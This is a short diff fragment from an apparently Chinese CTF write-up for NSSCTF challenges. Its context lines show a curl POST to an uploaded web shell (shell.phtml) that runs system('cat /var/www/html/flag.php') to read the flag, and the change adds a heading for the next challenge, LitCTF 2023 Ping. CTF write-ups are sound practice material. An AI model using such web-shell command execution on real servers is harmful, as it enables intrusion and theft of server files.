@@ -548,3 +548,6 @@ curl "http://node4.anna.nssctf.cn:29689/upload/shell.phtml" -Method POST -Body @
  curl "http://node4.anna.nssctf.cn:29689/upload/shell.phtml" -Method POST -Body @{cmd="system('cat /var/www/html/flag.php');"}
 ```
 成功读取`flag.php`文件得到`flag`
+
+---
+## [[LitCTF 2023]Ping - NSSCTF](https://www.nssctf.cn/problem/3873)
